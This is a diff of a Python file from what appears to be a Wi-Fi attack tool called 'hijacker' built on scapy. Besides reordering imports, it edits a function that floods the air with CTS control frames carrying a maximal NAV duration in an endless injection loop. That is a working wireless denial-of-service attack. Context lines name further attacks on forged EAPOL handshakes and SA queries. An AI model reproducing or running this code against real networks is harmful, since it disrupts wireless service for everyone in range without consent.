@@ -1,14 +1,13 @@
 from time import sleep
 
+from hijacker.core import Station, AP
+from hijacker.interface import MonitorInterface
 from scapy.contrib.wpa_eapol import WPA_key
 from scapy.fields import ByteField
 from scapy.layers.dot11 import Dot11, Dot11Auth, RadioTap, Dot11AssoReq, EAPOL, Dot11Elt, Dot11Beacon
 from scapy.packet import Packet
 from scapy.sendrecv import sniff
 from termcolor import cprint
-
-from hijacker.core import Station, AP
-from hijacker.interface import MonitorInterface
 
 WPA_KEY_INFO_INSTALL = 64
 WPA_KEY_INFO_ACK = 128
@@ -34,9 +33,10 @@ def forged_1(interface, ap, sta):
 def cts_nav_attack(interface):
     # http://matej.sustr.sk/publ/articles/cts-dos/cts-dos.en.html
     # pkt = RadioTap(len=18, present='Flags+Rate+Channel+dBm_AntSignal+Antenna',
-    pkt = RadioTap() / Dot11(type=1, subtype=12, ID=0xff7f, addr1="ff:ff:ff:ff:ff:ff")
+    pkt = RadioTap() / Dot11(type=1, subtype=12, ID=0xff7f, addr1="00:00:de:ad:be:ef")
     while True:
         interface.inject(pkt)
+        sleep(0.01)
 
 
 def sa_query_attack(interface, ap, sta):
